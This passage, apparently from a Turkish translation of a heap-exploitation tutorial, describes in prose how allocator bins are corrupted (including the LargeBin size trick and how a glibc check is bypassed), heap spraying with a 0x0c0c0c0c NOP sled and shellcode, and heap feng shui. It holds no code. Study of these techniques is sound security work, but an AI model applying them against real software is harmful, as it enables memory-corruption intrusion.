Bu zafiyetin mümkün olan en kısa sürede gerçekleşmesi için ideal olan şudur: Zafiyetli parçanın ayrılması, değiştirilecek parçanın ayrılması, bu parçanın serbest bırakılması, değiştirilecek parçadan daha büyük bir parça ayrılması, parça değiştirilir (zafiyet), zafiyetli parçadan aynı boyutta bir parça ayrılması ve zafiyetli parçadan aynı boyutta ikinci bir parça ayrılması ve bu parça seçilen adrese işaret edecektir.

Bu saldırıyı korumak için, tipik olarak "yanlış" parçanın kontrol edilmesi kullanılmıştır: bk->fd'nin victim'a işaret etmediği kontrol edilir. Yani, bizim durumumuzda, stack'te işaret edilen yanlış parçanın fd\* işaretçisinin victim'a işaret edip etmediği kontrol edilir. Bu korumayı aşmak için saldırganın, uygun şekilde (muhtemelen stack üzerinden) victim'ın adresini yazabilmesi gerekir. Böylece gerçek bir parça gibi görünür.

**LargeBin Bozulması**

Önceki gereksinimlerin yanı sıra, ayrılan parçaların 512'den büyük olması gerekmektedir.

Saldırı, öncekiyle aynıdır, yani bk işaretçisini değiştirmek gerekmektedir ve tüm bu malloc() çağrılarına ihtiyaç vardır, ancak değiştirilen parçanın boyutunu değiştirmek gerekmektedir, böylece bu boyut - nb < MINSIZE olmalıdır.

Örneğin, 1552 boyutunda bir parça koymak, 1552 - 1544 = 8 < MINSIZE olacak şekilde boyutu değiştirmek anlamına gelir (çıkarma negatif olmamalıdır çünkü bir unsigned karşılaştırılır).

Ayrıca, daha karmaşık hale getirmek için bir yama eklenmiştir.

**Heap Spreyi**

Temelde, mümkün olan tüm belleği heap'ler için ayırmak ve bunları bir shellcode ile biten bir nops yastığı ile doldurmaktır. Ayrıca, yastık olarak 0x0c kullanılır. Yani, 0x0c0c0c0c adresine atlamaya çalışılacak ve böylece bu yastıkla çağrılacak bir adres üzerine yazılırsa oraya atlanacaktır. Temel olarak taktik, birçok şeyi ayırmak ve bir noktaya atlamak için 0x0c0c0c0c adresine atlamayı denemektir, umut ederek orada nops olacağını.

**Heap Feng Shui**

Belleği parçalar arasında serbest bırakılmış parçaların arasında kalan parçalar şeklinde sementlemek için rezervasyonlar ve serbest bırakmalar kullanmaktır. Taşmayı yapılacak tampon bir yumurtanın içine yerleştirilecektir.
